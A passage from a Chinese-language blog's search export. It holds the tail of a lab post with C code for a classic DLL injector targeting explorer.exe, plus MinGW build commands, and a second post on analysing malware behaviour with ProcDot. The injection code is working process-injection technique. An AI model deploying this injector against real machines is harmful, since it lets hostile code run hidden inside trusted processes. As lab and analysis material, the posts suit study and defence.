&#125;</span><br><span class="line"></span><br><span class="line">    // 4. 準備要注入的 DLL 路徑</span><br><span class="line">    const char* dllPath = &quot;injected.dll&quot;; // 若不在同一目錄，可用絕對路徑</span><br><span class="line">    size_t dllPathSize = strlen(dllPath) + 1;</span><br><span class="line"></span><br><span class="line">    // 在目標進程中分配記憶體</span><br><span class="line">    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    if (!remoteMemory)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;VirtualAllocEx 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 寫入 DLL 路徑</span><br><span class="line">    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, dllPathSize, NULL))</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;WriteProcessMemory 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 5. 建立遠端執行緒，以 LoadLibraryA 載入 injected.dll</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(</span><br><span class="line">        hProcess,</span><br><span class="line">        NULL,</span><br><span class="line">        0,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)LoadLibraryA,</span><br><span class="line">        remoteMemory,</span><br><span class="line">        0,</span><br><span class="line">        NULL</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    if (!hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;CreateRemoteThread 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;成功注入到 explorer.exe (PID=%lu)\n&quot;, pid);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    // 若剛才有新建 explorer.exe，就等它結束 (可依需求保留或移除)</span><br><span class="line">    if (pi.hProcess)</span><br><span class="line">    &#123;</span><br><span class="line">        WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="3️⃣-編譯檔案"><a href="#3️⃣-編譯檔案" class="headerlink" title="3️⃣ 編譯檔案 "></a><font size='5'>3️⃣ 編譯檔案 </font></h4><br>

<p><img data-src='docker-1.png' width='700' align='center'></img></p>
<p><img data-src='docker-2.png' width='700' align='center'></img></p>
<br>

<ul>
<li><font size='3'>使用 Docker 指令</font></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 準備階段</span><br><span class="line"></span><br><span class="line"># 使用 Docker 對該資料進行映射，映射後資料夾全部內容都會被拉進容器內</span><br><span class="line">docker run --rm -it -v .:/work -w /work gcc:latest bash</span><br><span class="line"></span><br><span class="line"># 在容器內安裝 MinGW</span><br><span class="line">apt update &amp;&amp; apt install -y mingw-w64</span><br><span class="line"></span><br><span class="line"># 編譯階段</span><br><span class="line"></span><br><span class="line"># 對 injected.c 進行編譯，生成出 DLL</span><br><span class="line">x86_64-w64-mingw32-gcc -shared -o injected.dll injected.c </span><br><span class="line"></span><br><span class="line"># 對 injector.c 進行編譯，生成出 EXE</span><br><span class="line">x86_64-w64-mingw32-gcc injector.c -o injector.exe -mwindows</span><br></pre></td></tr></table></figure>

<br>

<ul>
<li><font size='3'>避免當機，提供 Restart 的簡易腳本，建立 <code>bat</code> 檔案運行即可</font></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">REM 關閉 explorer.exe（強制結束）</span><br><span class="line">taskkill /f /im explorer.exe</span><br><span class="line"></span><br><span class="line">REM 等待 2 秒（可依需求調整）</span><br><span class="line">timeout /t 2 /nobreak</span><br><span class="line"></span><br><span class="line">REM 重新啟動 explorer.exe</span><br><span class="line">start explorer.exe</span><br></pre></td></tr></table></figure>

<br>

<h4 id="4️⃣-運行結果"><a href="#4️⃣-運行結果" class="headerlink" title="4️⃣ 運行結果 "></a><font size='5'>4️⃣ 運行結果 </font></h4><ul>
<li><font size='3'>運行後，每隔 5 秒就會產生出一個 CMD</font></li>
</ul>
<p><img data-src='run-1.png' width='700' align='center'></img></p>
<br>

<ul>
<li><font size='3'>可以看到由 <code>explorer.exe</code> 帶起的 CMD</font></li>
</ul>
<p><img data-src='run-2.png' width='700' align='center'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>99999</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> <a href="https://blog.csdn.net/Onlyone_1314/article/details/108697155">IDA修改exe并保存运行</a> </font></li>
<li><font size='3'> <a href="https://yujiewong.github.io/2017/03/28/%E7%AC%AC2%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90Hello-World-%E7%A8%8B%E5%BA%8F/">逆向分析Hello World! 程序</a> </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Analysis</tag>
        <tag>Attack</tag>
        <tag>DLL</tag>
        <tag>Injection</tag>
        <tag>LAB</tag>
      </tags>
  </entry>
  <entry>
    <title>【ProcDot】 分析工具 - 流程圖</title>
    <url>/posts/32183/</url>
    <content><![CDATA[<hr>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h3><blockquote>
<p><font size='3'>把 <code>ProcDot</code> 工具使用方式紀錄一下。</font></p>
</blockquote>
<hr>
<span id="more"></span>


<h3 id="📝-環境需求"><a href="#📝-環境需求" class="headerlink" title="📝 環境需求"></a><font size='3'>📝 環境需求</font></h3><ul>
<li><font size='3'>WireShark -&gt; 匯出檔案 txt or Pcap</font></li>
<li><font size='3'>ProcMon -&gt; 匯出檔案 CSV</font></li>
<li><font size='3'><a href="https://www.winpcap.org/windump/install/">Windump</a> -&gt; <code>需下載</code></font></li>
<li><font size='3'><a href="https://graphviz.org/download/">Graphviz</a> -&gt; <code>需下載</code></font></li>
<li><font size='3'><a href="https://www.procdot.com/">官網</a> </font></li>
</ul>
<br>

<h3 id="1️⃣-準備好環境"><a href="#1️⃣-準備好環境" class="headerlink" title="1️⃣ 準備好環境"></a><font size='5'>1️⃣ 準備好環境</font></h3><hr>
<ol>
<li><font size='3'>準備好惡意程式</font></li>
<li><font size='3'>打開 <code>WireShark</code> 開始錄製</font></li>
<li><font size='3'>打開 <code>ProcMon</code> 開始錄製</font></li>
</ol>
<p><img data-src='env-1.png' width='700' align='center' alt='準備環境'></img></p>
<br>

<hr>
<br>


<h3 id="2️⃣-WireShark"><a href="#2️⃣-WireShark" class="headerlink" title="2️⃣ WireShark"></a><font size='5'>2️⃣ WireShark</font></h3><br>

<p><img data-src='wireshark-save-1.png' width='700' align='center' alt='儲存成 txt 檔案'></img></p>
<br>

<hr>
<h3 id="3️⃣-Procmon"><a href="#3️⃣-Procmon" class="headerlink" title="3️⃣ Procmon"></a><font size='5'>3️⃣ Procmon</font></h3><br>

<p><img data-src='procmon-setting-1.png' width='400' align='center' alt='確認 Thread ID 是否有勾選'></img></p>
<br>

<p><img data-src='procmon-save-1.png' width='700' align='center' alt='確認儲存為 .CSV檔'></img></p>
<br>


<h3 id="4️⃣-ProcDot"><a href="#4️⃣-ProcDot" class="headerlink" title="4️⃣ ProcDot"></a><font size='5' >4️⃣ ProcDot</font></h3><hr>
<ol>
<li><font size='3'>選擇好環境時下載的檔案</font></li>
</ol>
<p><img data-src='procdot-option-1.png' width='600' align='center' alt='Path Setting'></img></p>
<br>

<ol start="2">
<li><font size='3'>再來選擇剛剛保存的檔案</font></li>
</ol>
<p><img data-src='procdot-option-2.png' width='600' align='center' alt='Procmon、WireShark'></img></p>
<br>

<ol start="3">
<li><font size='3'>選擇要查看的進程，完成後點選 <code>ReFresh</code></font></li>
</ol>
<p><img data-src='procdot-option-3.png' width='600' align='center' alt='Launcher'></img></p>
<br>

<p><img data-src='procdot-option-4.png' width='600' align='center' alt='ReFresh'></img></p>
<br>

<ol start="4">
<li><font size='3'>顯示出流程圖表</font></li>
</ol>
<p><img data-src='flow-1.png' width='700' align='center' alt='流程圖'></img></p>
<br>

<p><img data-src='flow-2.png' width='700' align='center' alt='修改機碼'></img></p>
<br>

<hr>
<br>

<h3 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h3><ul>
<li><font size='3'>該惡意程式會修改到 <code>Window NT</code> 的機碼，達到 <code>自動啟動</code> 的效果</font></li>
</ul>
<br>

<hr>
<h3 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h3><ul>
<li><font size='3'> <a href="https://cloud.tencent.cn/developer/article/2350803">使用ProcDot进行恶意软件分析</a> </font></li>
</ul>
]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>tool</tag>
        <tag>ProcDot</tag>
      </tags>
  </entry>
</search>
